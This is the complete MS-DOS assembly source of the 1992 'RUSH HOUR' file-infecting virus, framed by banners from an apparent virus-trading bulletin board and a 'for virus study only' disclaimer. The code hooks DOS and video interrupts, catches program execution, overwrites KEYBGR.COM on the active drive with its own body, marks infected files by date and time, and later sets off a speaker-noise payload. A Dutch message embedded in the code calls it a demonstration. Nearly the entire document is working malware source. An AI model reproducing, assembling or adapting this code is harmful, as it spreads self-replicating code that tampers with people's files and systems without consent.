;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
page  72,132
                title   Virus"RUSH HOUR"        (c) Hanx ,1992
                name    VIRUS

abso            segment at 0
                org     4*10h
video_int       dw      2 dup (?)
                org     4*21h
dos_int         dw      2 dup (?)
                org     4*24h
error_int       dw      2 dup (?)
abso            ends

code            segment
                assume  cs:code, ds:code, es:code

                org     05ch
fcb             label   byte
drive           db      ?
fspec           db      11 dup (' ')
                org     6ch
fsize           dw      2 dup (?)
fdate           dw      ?
ftime           dw      ?
                org     80h
dta             dw      128 dup (?)

                org     071eh
                xor     ax,ax
                mov     es,ax
                assume  es:abso
                push    cs
                pop     ds
                mov     ax,video_int
                mov     bx,video_int+2
                mov     word ptr video_vector,ax
                mov     word ptr video_vector+2,bx
                mov     ax,dos_int
                mov     bx,dos_int+2
                mov     word ptr dos_vector,ax
                mov     word ptr dos_vector+2,bx
                cli
                mov     dos_int,offset virus
                mov     dos_int+2,cs
                mov     video_int,offset disease
                mov     video_int+2,cs
                sti
                mov     ah,0
                int     1ah
                mov     time_0,dx
                lea     dx,virus_einde
                int     27h
video_vector    dd      (?)
dos_vector      dd      (?)
error_vector    dw      2 dup (?)
time_0          dw      ?

rndval          db      'bfhg'
active          db      0
preset          db      0
                db      'A:'
fname           db      'KEYBGR  COM'
                db      0

virus           proc    far
                assume  cs:code, ds:nothing, es:nothing
                push    ax
                push    cx
                push    dx
                mov     ah,0
                INT     1AH
                SUB     DX,TIME_0
                CMP     DX,16384
                JL      $3
                MOV     ACTIVE,1
$3:             pop     dx
                pop     cx
                pop     ax
                cmp     ax,4b00h
                je      $1
exit_1:         jmp     dos_vector
$1:             push    es
                push    bx
                push    ds
                push    dx
                mov     di,dx
                mov     drive,0
                mov     al,ds:[di+1]
                cmp     al,':'
                jne     $5
                mov     al,ds:[di]
                sub     al,'A'-1
                mov     drive,al
$5:             cld
                push    cs
                pop     ds
                xor     ax,ax
                mov     es,ax

                assume  ds:code, es:abso

                mov     ax,error_int
                mov     bx,error_int+2
                mov     error_vector,ax
                mov     error_vector+2,bx
                mov     error_int,offset error
                mov     error_int+2,cs
                push    cs
                pop     es

                assume  es:code

                lea     dx,dta
                mov     ah,1ah
                int     21h
                mov     bx,11
$2:             mov     al,fname-1[bx]
                mov     fspec-1[bx],al
                dec     bx
                jnz     $2
                lea     dx,fcb
                mov     ah,0fh
                int     21h
                cmp     al,0
                jne     exit_0
                mov     byte ptr fcb+20h,0
                mov     ax,ftime
                cmp     ax,4800h
                je      exit_0
                mov     preset,1
                mov     si,100h
$4:             lea     di,dta
                mov     cx,128
                rep     movsb
                lea     dx,fcb
                mov     ah,15h
                int     21h
                cmp     si,offset virus_einde
                jl      $4
                mov     fsize,offset virus_einde -100h
                mov     fsize+2,0
                mov     fdate,0AA3h
                mov     ftime,4800h
                lea     dx,fcb
                mov     ah,10h
                int     21h
                xor     ax,ax
                mov     es,ax
                assume  es:abso
                mov     ax,error_vector
                mov     bx,error_vector+2
                mov     error_int,ax
                mov     error_int+2,bx

exit_0:         pop     dx
                pop     ds
                pop     bx
                pop     es
                assume  ds:nothing, es:nothing
                mov     ax,4b00h
                jmp     dos_vector
virus   endp
error   proc    far
                iret
error   endp
disease proc    far
                assume ds:nothing, es:nothing
                push    ax
                push    cx
                test    preset,1
                jz      exit_2
                test    active,1
                jz      exit_2
                in      al,61h
                and     al,0feh
                out     61h,al
                mov     cx,3
noise:          mov     al,rndval
                xor     al,rndval+3
                shl     al,1
                shl     al,1
                rcl     word ptr rndval,1
                rcl     word ptr rndval+2,1
                mov     ah,rndval
                and     ah,2
                in      al,61h
                and     al,0fdh
                or      al,ah
                out     61h,al
                loop    noise
                and     al,0fch
                or      al,1
                out     61h,al
exit_2:         pop     cx
                pop     ax
                jmp     video_vector
disease         endp

                db      'Dit is een demonstratie van een zogenaamd computervirus.'
                db      'Het heeft volledige controle over alle systeem-componenten'
                db      'en alle harde schijven en in de drive(s) ingevoerde'
                db      'diskettes. Het programma kopieert zichzelf naar andere,'
                db      'nog niet besmette besturingssystemen en verspreidt zich op'
                db      'die manier ongecontroleerd. In dit geval zijn er geen'
                db      'programma`s beschadigd of schijven gewist, omdat dit'
                db      'slechts een demonstratie is. Een kwaadaardig virus'
                db      'had echter wel degelijk schade aan kunnen richten.'

                org     1c2ah
virus_einde     label   byte
code    ends
end


;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

